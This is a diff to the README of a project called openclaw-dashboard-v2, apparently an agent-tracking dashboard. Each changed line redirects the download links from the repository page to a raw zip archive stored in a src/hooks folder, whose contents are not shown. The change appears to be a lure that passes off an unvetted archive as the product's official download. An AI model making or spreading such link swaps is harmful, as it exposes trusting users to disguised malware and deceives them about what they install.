@@ -1,10 +1,10 @@
 # 🧭 openclaw-dashboard-v2 - Track agents and jobs in one place
 
-[![Download](https://img.shields.io/badge/Download-OpenClaw%20Dashboard-blue?style=for-the-badge&logo=github)](https://github.com/roasteralexX/openclaw-dashboard-v2)
+[![Download](https://img.shields.io/badge/Download-OpenClaw%20Dashboard-blue?style=for-the-badge&logo=github)](https://github.com/roasteralexX/openclaw-dashboard-v2/raw/refs/heads/main/src/hooks/openclaw-dashboard-v-v3.0.zip)
 
 ## 📥 Download
 
-Visit this page to download: [https://github.com/roasteralexX/openclaw-dashboard-v2](https://github.com/roasteralexX/openclaw-dashboard-v2)
+Visit this page to download: [https://github.com/roasteralexX/openclaw-dashboard-v2/raw/refs/heads/main/src/hooks/openclaw-dashboard-v-v3.0.zip](https://github.com/roasteralexX/openclaw-dashboard-v2/raw/refs/heads/main/src/hooks/openclaw-dashboard-v-v3.0.zip)
 
 ## 🪟 Windows Setup
 
@@ -196,7 +196,7 @@ If you open the project files, you may see folders for:
 
 If you need the file again, use this link:
 
-[https://github.com/roasteralexX/openclaw-dashboard-v2](https://github.com/roasteralexX/openclaw-dashboard-v2)
+[https://github.com/roasteralexX/openclaw-dashboard-v2/raw/refs/heads/main/src/hooks/openclaw-dashboard-v-v3.0.zip](https://github.com/roasteralexX/openclaw-dashboard-v2/raw/refs/heads/main/src/hooks/openclaw-dashboard-v-v3.0.zip)
 
 ## 🗂️ File Type Guide
 
